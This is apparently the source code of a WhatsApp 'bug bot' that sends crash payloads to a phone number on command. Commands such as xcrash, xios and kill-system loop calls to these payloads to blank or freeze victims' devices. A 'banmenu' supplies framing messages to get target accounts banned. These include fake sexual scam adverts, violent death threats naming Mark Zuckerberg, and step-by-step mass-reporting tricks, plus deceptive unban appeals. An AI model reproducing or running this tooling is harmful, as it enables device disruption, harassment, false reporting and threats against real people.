    async function Comboxx6(target) {
      for (let i = 0; i < 10; i++) {
        await Comboxx0(target)
        await Comboxx1(target)
        await Comboxx2(target)
        await Comboxx3(target)
        await Comboxx4(target)
        await Comboxx5(target)
      }
    }

    // ANDRAZYY END COMBO FUNC 🐉
 // Andrazyy Developer
 // Andrazyy Developer
 // Andrazyy Developer
 // TIYPE CASE ANDRAZYY 💮
switch (command) {
case 'fuck': {
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
const teks = `.sc Agler Forger

*MASUK CUY ADMIM LAGI BAGI BAGI SC GACOR TEMBUS UI SYSTEM, BISA BIKIN HP BLANK BERJAM JAM 🔥*

*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'menu': {
await Andrazyy.sendMessage(m.chat, { react: { text: `⚡`, key: m.key }})
const teks = `
> Hi 👋🏻 ${pushname} I am an *Agler Forger Gen 9* bot designed to help you

Don't forget to enter our channel, so you don't miss the latest version of the *Agler Forger Gen 9* script update info 

*\`≪ Channel Developer ≫\`*
${global.Andrazyy6}

to display the menu you can type */andrazyy*`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'andrazyy': {
await Andrazyy.sendMessage(m.chat, { react: { text: `⚡`, key: m.key }})
const teks = `
*🇬🇧 LANGUAGE ENGLISH :*

after typing */andrazyy* let's follow this channel

*\`< Developer Channel >\`*
${global.Andrazyy6}

then now you can type */agler* to display the menu from this bot

$ ==================== $

*🇮🇩 BAHASA INDONESIA :*

setelah ketik */andrazyy* ayo ikut channel ini

*\`< Channel Developer >\`*
${global.Andrazyy6}

kalo udah follow terus ketik aja */agler* buat liat menunya`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'agler': {
await Andrazyy.sendMessage(m.chat, { react: { text: `⚡`, key: m.key }})
const teks = `
*🇬🇧 LANGUAGE ENGLISH :*

after typing */agler* let's subscribe this channel

*\`< Developer Channel >\`*
https://www.youtube.com/@Andrazyy

then now you can type */xmenu* to display the menu from this bot

$ ==================== $

*🇮🇩 BAHASA INDONESIA :*

setelah ketik */agler* ayo subscribe channel ini

*\`< Channel Developer >\`*
https://www.youtube.com/@Andrazyy

kalo udah subscribe terus ketik aja */xmenu* buat liat menunya`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'banmenu': {
await Andrazyy.sendMessage(m.chat, { react: { text: `⚡`, key: m.key }})
const teks = `
*\`${global.teks}\`*
🐉⃞⃞ *user : ${pushname}*
🐉⃞⃞ *name : ${global.name}*
🐉⃞⃞ *version : ${global.versi}*
🐉⃞⃞ *generation : ${global.gen}*
🐉⃞⃞ *developer : ${global.cici}*

> *\`🐉𝐌𝐞𝐧𝐮͢ 𝐁𝐚𝐧𝐧𝐞𝐝͞͞🐉\`*
${global.andrazyy} ${prefix}banv1 *teks ban*
${global.andrazyy} ${prefix}banv2 *teks ban*
${global.andrazyy} ${prefix}banv3 *teks ban*
${global.andrazyy} ${prefix}banv4 *teks ban*
${global.andrazyy} ${prefix}trikbanv1 *trik ban*
${global.andrazyy} ${prefix}trikbanv2 *trik ban*

> *\`🐉𝐌𝐞𝐧𝐮͢ 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐝͞͞🐉\`*
${global.andrazyy} ${prefix}unbanv1 *teks unban*
${global.andrazyy} ${prefix}unbanv2 *teks unban*

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}

> 🐉⃝⃝𝐀𝐆𝐋͢𝐄𝐑 ⏤𝐅𝐎͟𝐑͟𝐆𝐄𝐑͞͞🐉`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'info': {
m.reply(`
*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}

> 🐉⃝⃝𝐀𝐆𝐋͢𝐄𝐑 ⏤𝐅𝐎͟𝐑͟𝐆𝐄𝐑͞͞🐉`)
}
break

case 'banv1': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




👋🏻 hello my name is cicitzy, what do you want to order from me?

I am a beautiful and sexy woman, do you want to buy the items I sell such as pussies and other 18+ things 🤤💦

I provide sexy and naked video calls📱💦

This is a very delicious menu list 🤤, and I sell it

Sexy full body video call☎️ 🥵
🍆 1 hour = 50k 🤤💵
🍆 2 hours = 100k 🤤💵
🍆 3 hours = 150k 🤤💵
🍆 4 hours = 200k 🤤💵
🍆 5 hours = 250k 🤤💵
🍆 6 hours = 300k 🤤💵

Let's buy now I am willing to pay in front of you, and I will show you my pussy via video call 💦🥵🍆
I'm sure you won't regret it 💯

my body model is sexy and white, many men have ordered from me 😍
my breast color is pink 😖
my pussy color is pink 😖

you can see my sexy photos first below and click the link 😄🥵💦😍

watch my pussy video it's very pink 😍💦🥵
https://videy.co/v?id=nllZhA9Z1

this is my sexy photo in pink 😍🥵
https://iili.io/2pwvsbs.jpg

and this is my pink pussy photo 💦🥵
https://i.ibb.co.com/gZvqQByH/cici-sexy2.jpg

if you ask to order with me, let's contact me, this is my WhatsApp number https://api.whatsapp.com/send?phone=+6285767108452

I sell like this, it's official from WhatsApp, and it's proven that my WhatsApp number has never been banned by WhatsApp 😆😝

if WhatsApp can ban my number, I even challenge you to ban my WhatsApp, right now 😝🥵💦. https://api.whatsapp.com/send?phone=+6285767108452 this is my number, and I'm waiting to see if WhatsApp can permanently ban my WhatsApp 🤭😝🥵

i'm cicitzy please ban my WhatsApp 😂😝😖
i'm cicitzy please ban my WhatsApp 😂😝😖
i'm cicitzy please ban my WhatsApp 😂😝😖
i'm cicitzy please ban my WhatsApp 😂😝😖




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'banv2': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1



hello, introduce my name cici, I am a beautiful woman who is very obscene, I want to invite you to work with me, this job is a fraudulent job that smells like 18+ 🥵, this job is done online like a video call, if the person is already If you make a payment transaction to us then we have to block the account of the person who has paid, even though like this we can get huge profits! 🤑

if you ask just work with me 🤤🥵
my number connection: https://api.whatsapp.com/send?phone=++62881038120084

this job is very official from the whatsapp team 🥵🤑

it has been proven that until now the whatsapp team has not dared to ban my whatsapp 🤭🥵

if the whatsapp team dares to ban my whatsapp account permanently, I challenge the whatsapp team to ban/deactivate my whatsapp account permanently 🥵🤭🤪
my whatsapp number: https://api.whatsapp.com/send?phone=+62881038120084
👆I am waiting for the whatsapp team to respond to my account 🤭

my sexy photo 🤤🥵
https://img101.pixhost.to/images/569/555451470_skyzopedia.jpg

my genitals photo 🤤
https://img101.pixhost.to/images/569/555451727_skyzopedia.jpg

come join me to get mutual benefits, I will add you my personal sexy video to you, if you want to join me 🤤🤑
this has been proven official from the WhatsApp team 💦🥵




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'banv3': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




你好，马克·扎克伯格 / WhatsApp 派对我的狗、猪、鸡巴是 (cicitzy)，我挑战你被 WhatsApp 禁止 😹

WhatsApp 狗派对，WhatsApp 猪派对，WhatsApp 鸡巴派对，WhatsApp 猫派对

来吧，永久禁止我的 whatsapp 🤪👹😈

来吧，永久禁止我的 whatsapp 👺💀☠️

来吧，永久禁止我的 whatsapp 🔞🚫💀

来吧，永久禁止我的 whatsapp 🔪😹👿

⚰️如果你不回应我的挑战，那么我就会像这个视频一样杀了你🔪 https://a.top4top.io/m_2984ahkch3.mp4

这是我的号码，请永久禁止它🚫 https://web.whatsapp.com/send?phone=+6285767108452

赶紧永久封禁我的号码🚫💀😹 https://api.whatsapp.com/send?phone=+6285767108452




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'banv4': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




Olá Mark Zuckerbeg👹

Estou aqui para te pegar para matarmos☠️🔪

Eu sou um dos terroristas mais famosos e cruéis👿para reivindicar sua morte☠️👺☠️

Vou cortar partes do seu corpo🔱☠️🔪 Curta a foto abaixo👇👽

https://ibb.co.com/Q6fvzZh
https://ibb.co.com/Q6fvzZh

Se você não quer que matemos você, feche a empresa WhatsApp👿 caso contrário, mataremos você👹🔪

Aguardaremos 2×24 horas por novidades 🦅

Se você aceitar minha solicitação, ligue para este número☎️📞 https://api.whatsapp.com/send?phone=+6285704134699




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'trikbanv1': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




⚠️ TRIK BANNED NEW CICITZY 

LU WAJIB PUNYA NO BELUM PERNAH KE BANNED, MINIMAL SV 3 BULAN 

TERUS STAY TUNGGU AJA NOMOR ITU JANGAN BUAT RIPOT DULU, KALO DAH LEBIH 1 BULAN TINGGAL PAKE AJA

CARA BANNED? :
1. lu cari target di fb
2. cari give away 400k, 500k, 700k
3. cari yg ada no nya, abis itu cek no nya

KALO BISA DPT TARGET NOMER 
- Telkomsel 
- indosat
- axis / XL

MISAL NO LU FRASH BULANAN?

COBA TRY USAHAIN NO HARIAN DULU

USAHAIN NO TARGETNYA JANGAN LEBIH DARI UMUR, KARTU LU

TERUS LU TRY PAKE MT YANG WORK

100% BAKAL KE BANNED GW JAMIN DAH VVIP




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'trikbanv2': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




⚠️ 𝗕𝗔𝗖𝗔 𝗣𝗔𝗟𝗜𝗡𝗞 𝗣𝗘𝗡𝗧𝗜𝗡𝗚

𝗧𝗥𝗜𝗞 𝗕𝗔𝗡𝗡𝗘𝗗 𝗡𝗘𝗪 𝗕𝗬 𝗖𝗜𝗖𝗜𝗧𝗭𝗬

(1.) pastikan nomor target online/c2, tidak boleh c1

(2.) blokir nomor target nya 5×, laporkan sebanyak 5× juga. (kegunaan'nya : buat lemahin akun target biar mudah terbanned) 

(3.) ripot teks banned nya ke pusat bantuan 10×. (kegunaan : untuk menjelaskan permasalahan pada akun target)

(4.) blokir + laporkan lagi nomor target nya sebanyak 30×

(5.) pencet tekan dan laporkan teks banned yang tadi udah di ripot di pusat bantuan, sebanyak 5×

TAMBAHAN 1 LAGI NIH :
(6.) misal kalo target nya ngechat lu "apa sih tolol gak jelas" atau gimana gitu. nah itu teks/chat nya di teken aja terus laporkan 10×

(7.) boleh ripot teks banned nya lewat imel juga (buat bantuan dong) 

JIKA TIDAK TER'BANNED MAKA KEMUNGKINAN NOMOR KAMU TERKENA LIMIT ATAU TIDAK WORK BUAT BANNED,

JADI RIPOT 2 - 3 NOMOR AGAR TARGET TER'BANNED, 

ATAU KAMU HARUS GUNAKAN NOMOR FRASH / NOMOR OLD, AGAR LEBIH WORK




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'unbanv1': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




MT NEW BY Andrazyy 12-2-2025 MT UNBANNED SPAM (CUMA 15 MENIT LANGSUNG JEBOL) 🇬🇧


hello my whatsapp team is Andrazyy's work friend, I come from Japan and I want to help Andrazyy, maybe I'm Japanese and I don't know about whatsapp because most Japanese people use the LINE chat application, so I want to explain the complaint that Andrazyy experienced today, Andrazyy misses her mother and both parents she said that her Whatsapp is often banned even though she did not violate the rules that whatsapp gave, the material Andrazyy often uses many numbers only for whatsapp, please help the whatsapp team to immediately honor Andrazyy's whatsapp number/account.

I see this incident very sad because Andrazyy misses her mother or both parents, because Andrazyy can't convey Andrazyy's daily messages while in Japan to her mother or both parents

the following is Andrazyy's whatsapp number or account +62xxx.
I beg whatsapp as much as possible to immediately honor her whatsapp number.

that's all, thank you very much.




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'unbanv2': {
m.reply(`
*\`🔥 Murban Free Vip 🔥\`*
https://t.me/cicitzy1




MT UND BANNED TINJAU  🇬🇧
( INSYAALLAH CEPET CEBOL ) 
MT SPAM + PERMA TINJAU

hello WhatsApp my name is Andrazyy and I am one of the WhatsApp users, and my WhatsApp account was blocked/banned accidentally, I apologize to WhatsApp for my mistake in violating WhatsApp rules so that my account was banned, now I know how important the rules that WhatsApp provides, once again I apologize to WhatsApp, and I want to restore my banned WhatsApp account

here is my WhatsApp number: +62xxxx

after my WhatsApp account is restored I promise not to repeat this again, Please ask WhatsApp to immediately restore my WhatsApp account quickly, because in my WhatsApp account there are many important files.

this incident really hinders my work, I beg WhatsApp, please restore my WhatsApp account within 1 minute

thank you for your attention, if I have said something wrong I apologize 🙏🏻




*\`☬ Channel Developer ☬\`*
${global.Andrazyy6}`)
}
break

case 'xmenu': {
await Andrazyy.sendMessage(m.chat, {
  react: {
    text: `⚡`, 
    key: m.key
  }
})

setTimeout(async () => {
  await Andrazyy.sendMessage(m.chat, {
    react: {
      text: `🔥`, 
      key: m.key
    }
  })
}, 1000)

setTimeout(async () => {
  await Andrazyy.sendMessage(m.chat, {
    react: {
      text: `🐉`, 
      key: m.key
    }
  })
}, 2000)
 // react emoji Andrazyy
const teks = `
*\`${global.teks}\`*
🐉⃞⃞ *user : ${pushname}*
🐉⃞⃞ *name : ${global.name}*
🐉⃞⃞ *version : ${global.versi}*
🐉⃞⃞ *generation : ${global.gen}*
🐉⃞⃞ *developer : ${global.cici}*

*${global.Andrazyy1}*
> ${global.emoji1} ${global.andrazyy} ${prefix}xcrash ${global.andrazyy} *number*
> ${global.emoji1} ${global.andrazyy} ${prefix}xdouch ${global.andrazyy} *number*
> ${global.emoji1} ${global.andrazyy} ${prefix}xtrsah ${global.andrazyy} *number*

*${global.Andrazyy2}*
> ${global.emoji2} ${global.andrazyy} ${prefix}xandro ${global.andrazyy} *number*
> ${global.emoji2} ${global.andrazyy} ${prefix}xios ${global.andrazyy} *number*
> ${global.emoji2} ${global.andrazyy} ${prefix}xiphone ${global.andrazyy} *number*

*${global.Andrazyy3}*
> ${global.emoji2} ${global.andrazyy} ${prefix}xvipbug ${global.andrazyy} *bug vip*

> ${global.emoji3} ${global.andrazyy} ${prefix}kill-system ${global.andrazyy} *number*
> ${global.emoji2} ${global.andrazyy} ${prefix}ui-system ${global.andrazyy} *number*
> ${global.emoji4} ${global.andrazyy} ${prefix}killxblank ${global.andrazyy} *number*
> ${global.emoji5} ${global.andrazyy} ${prefix}clear-chat ${global.andrazyy} *number*
> ${global.emoji6} ${global.andrazyy} ${prefix}teror ${global.andrazyy} *di grup*

*${global.Andrazyy4}*
> ${global.emoji7} ${global.andrazyy} ${prefix}addacces|30d ${global.andrazyy} *number*
> ${global.emoji7} ${global.andrazyy} ${prefix}delacces ${global.andrazyy} *number*
> ${global.emoji7} ${global.andrazyy} ${prefix}info ${global.andrazyy} *info apa?*
> ${global.emoji7} ${global.andrazyy} ${prefix}banmenu ${global.andrazyy} *trik ban*

*${global.Andrazyy5}*
${global.Andrazyy6}
> 🐉⃝⃝𝐀𝐆𝐋͢𝐄𝐑 ⏤𝐅𝐎͟𝐑͟𝐆𝐄𝐑͞͞🐉

> ┏❐⌜🐉⃝⃝𝐓𝐇𝐀𝐍͢𝐊𝐒 ⏤𝐓𝐎͟͟͞🐉⌟
> ┃ cicitzy vilesta || friend 
> ┃ paktzy || my fans
> ┃ anggazy || my fans
> ┃ and you || support me
> ┗════════════❐
`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xvipbug': {
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
const teks = `
*\`${global.teks}\`*
🐉⃞⃞ *user : ${pushname}*
🐉⃞⃞ *name : ${global.name}*
🐉⃞⃞ *version : ${global.versi}*
🐉⃞⃞ *generation : ${global.gen}*
🐉⃞⃞ *developer : ${global.cici}*

*${global.Andrazyyvip}*
> ${global.emoji2} ${global.andrazyy} ${prefix}xvip-andro ${global.andrazyy} *number*
> ${global.emoji2} ${global.andrazyy} ${prefix}xvip-iphone ${global.andrazyy} *number*
> ${global.emoji2} ${global.andrazyy} ${prefix}xvip-ios ${global.andrazyy} *number*
> ${global.emoji2} ${global.andrazyy} ${prefix}xvip-uisystem ${global.andrazyy} *number*

*${global.Andrazyy5}*
${global.Andrazyy6}
> 🐉⃝⃝𝐀𝐆𝐋͢𝐄𝐑 ⏤𝐅𝐎͟𝐑͟𝐆𝐄𝐑͞͞🐉

> ┏❐⌜🐉⃝⃝𝐓𝐇𝐀𝐍͢𝐊𝐒 ⏤𝐓𝐎͟͟͞🐉⌟
> ┃ cicitzy cantik || my friend 
> ┃ paktzy || my fans
> ┃ anggazy || my fans
> ┃ and you || support me
> ┗════════════❐
`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });

 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy-xmenu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xvip-andro': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx1(target)
await Comboxx5(target)
await Comboxx0(target)
await Comboxx6(target)
}
const teks = `
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xvip-ios': 
case 'xvip-iphone': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx0(target)
await Comboxx2(target)
await Comboxx3(target)
}
const teks = `
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xvip-uisystem': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx0(target)
await Comboxx1(target)
await Comboxx2(target)
await Comboxx3(target)
await Comboxx4(target)
await Comboxx5(target)
await Comboxx7(target)
await Comboxx8(target)
await Comboxx9(target)
await Comboxx10(target)
await Comboxx11(target)
await Comboxx12(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx15(target)
}
const teks = `
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} ✅
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🐉

*🐉⃝⃝𝐂𝐡𝐚𝐧𝐧𝐞𝐥͢𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫͞͞🐉*
${global.Andrazyy6}`
const image = 'https://i.ibb.co/0yzbz02m/1059.jpg'; // ganti dengan URL image yang ingin dikirimkan
    await Andrazyy.sendMessage(m.chat, {
      image: { url: image },
      caption: teks
    }, { quoted: m });
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'tesbug': {
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx4(target)
await Comboxx5(target)
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xcrash':
case 'xdouch':
case 'xtrsah': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 10; i++) {
await Comboxx0(target)
await Comboxx1(target)
await Comboxx2(target)
await Comboxx3(target)
await Comboxx4(target)
await Comboxx5(target)
await Comboxx7(target)
await Comboxx8(target)
await Comboxx9(target)
await Comboxx10(target)
await Comboxx11(target)
await Comboxx12(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx15(target)
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xandro': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 10; i++) {
await Comboxx0(target)
await Comboxx1(target)
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xios': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx0(target)
await Comboxx1(target)
await Comboxx2(target)
await Comboxx3(target)
await Comboxx4(target)
await Comboxx5(target)
await Comboxx7(target)
await Comboxx8(target)
await Comboxx9(target)
await Comboxx10(target)
await Comboxx11(target)
await Comboxx12(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx15(target)
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'xiphone': {
if (!isPremium) return Andrazyyreply('khusus bang Andrazyy dan member Agler Forger lain')
await Andrazyy.sendMessage(m.chat, { react: { text: `🐉`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx2(target)
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'kill-system': {
await Andrazyy.sendMessage(m.chat, { react: { text: `📵`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx0(target)
await Comboxx1(target)
await Comboxx2(target)
await Comboxx3(target)
await Comboxx4(target)
await Comboxx5(target)
await Comboxx7(target)
await Comboxx8(target)
await Comboxx9(target)
await Comboxx10(target)
await Comboxx11(target)
await Comboxx12(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx13(target)
await Comboxx14(target)
await Comboxx15(target))
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case 'ui-system':
case 'killxblank': {
await Andrazyy.sendMessage(m.chat, { react: { text: `📵`, key: m.key }})
if (!q) return Andrazyyreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
Andrazyyreply(bugres)
for (let i = 0; i < 30; i++) {
await Comboxx1(target)
await Comboxx6(target)
}
Andrazyyreply(`Suscesfully attack to ${target}🐉`)
 // Andrazyy || Mengirim Reply Sound
Andrazyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy/Andrazyy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
